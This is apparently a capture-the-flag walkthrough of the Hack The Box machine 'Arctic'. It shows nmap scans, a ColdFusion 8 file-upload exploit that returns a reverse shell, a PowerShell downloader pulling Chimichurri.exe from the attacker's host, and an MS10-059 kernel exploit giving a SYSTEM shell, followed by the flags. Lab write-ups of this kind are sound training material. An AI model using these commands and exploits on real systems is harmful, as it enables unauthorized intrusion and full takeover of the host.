# ARCTIC

## NMAP

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/arctic]
└─$ nmap 10.10.10.11 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 04:40 EST
Nmap scan report for 10.10.10.11
Host is up (0.32s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 23.45 seconds
                                                                                                 
┌──(kali㉿kali)-[~/Downloads/hackthebox/arctic]
└─$ nmap 10.10.10.11 -Pn -p 135,8500,49154 -A
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 04:43 EST
                                                                                               
┌──(kali㉿kali)-[~/Downloads/hackthebox/arctic]
└─$ nmap 10.10.10.11 -Pn -p 135,8500,49154 -A
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 04:43 EST
Nmap scan report for 10.10.10.11
Host is up (0.30s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## PORT 8500

![](https://github.com/Leo-2807/Writeups/blob/main/images/arctic1.png)

On doing a quick google search I found that `Adobe Cold Fusion` runs on this port.

![](https://github.com/Leo-2807/Writeups/blob/main/images/arctic2.png)

We can also see that on the `administrator` page.

![](https://github.com/Leo-2807/Writeups/blob/main/images/arctic3.png)

## EXPLOIT

Here we see that it's `ColdFusion 8` that's running and on searching for it's [exploit](https://www.exploit-db.com/exploits/50057) I find one on exploitdb.

On downloading and running the exploit we get a shell.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/arctic]
└─$ ./exploit.py

Generating a payload...
Payload size: 1496 bytes
Saved as: e84d482d6bdc461fbe553628121e2beb.jsp

Priting request...
Content-type: multipart/form-data; boundary=2cf803ec76ec41ca9d9231291ee9817c
Content-length: 1697

--2cf803ec76ec41ca9d9231291ee9817c
Content-Disposition: form-data; name="newfile"; filename="e84d482d6bdc461fbe553628121e2beb.txt"
Content-Type: text/plain

...snip...

Printing some information for debugging...
lhost: 10.10.14.2
lport: 4444
rhost: 10.10.10.11
rport: 8500
payload: e84d482d6bdc461fbe553628121e2beb.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.11] 49243







Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>
```

From here we can grab the user.txt.

```bash
C:\Users\tolis\Desktop>type user.txt
type user.txt
02650d3a69a70780c302e146a6cb96f3
```

## PRIVESEC

I grabed the system informaion using the `systeminfo` command and used it to run `windows exploit suggester`

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/Windows-Exploit-Suggester]
└─$ ./windows-exploit-suggester.py --database 2021-11-12-mssb.xls --systeminfo systeminfo.txt 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

After some tries the one that worked was `ms10-059` [exploit](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled)


I created a powershell file and ran it to get the exploit on the target machine.

```bash
C:\ColdFusion8\runtime\bin>echo $client = New-Object System.Net.Webclient > df.psl
echo $client = New-Object System.Net.Webclient > df.psl

C:\ColdFusion8\runtime\bin>echo $url = "http://10.10.14.2:8000/Chimichurri.exe" >> df.psl
echo $url = "http://10.10.14.2:8000/Chimichurri.exe" >> df.psl

C:\ColdFusion8\runtime\bin>echo $file = "exploit.exe" >> df.psl
echo $file = "exploit.exe" >> df.psl

C:\ColdFusion8\runtime\bin>echo $client.DownloadFile($url,$file) >> df.psl
echo $client.DownloadFile($url,$file) >> df.psl

C:\ColdFusion8\runtime\bin>type df.psl
type df.psl
$client = New-Object System.Net.Webclient 
$url = "http://10.10.14.2:8000/Chimichurri.exe" 
$file = "exploit.exe" 
$client.DownloadFile($url,$file) 

C:\ColdFusion8\runtime\bin>powershell.exe -ExecurionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File df.psl
powershell.exe -ExecurionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File df.psl
```

Now we just execute the exploit to get a shell with administrator.

```bash
C:\ColdFusion8\runtime\bin>exploit.exe 10.10.14.2 9999
exploit.exe 10.10.14.2 9999
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
```

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/arctic]
└─$ nc -lvnp 9999
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.11.
Ncat: Connection from 10.10.10.11:50381.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ProgramData>whoami
nt authority\system
```

And here we can grab root.txt

```bash
C:\Users\Administrator\Desktop>type root.txt
ce65ceee66b2b5ebaff07e50508ffb90
```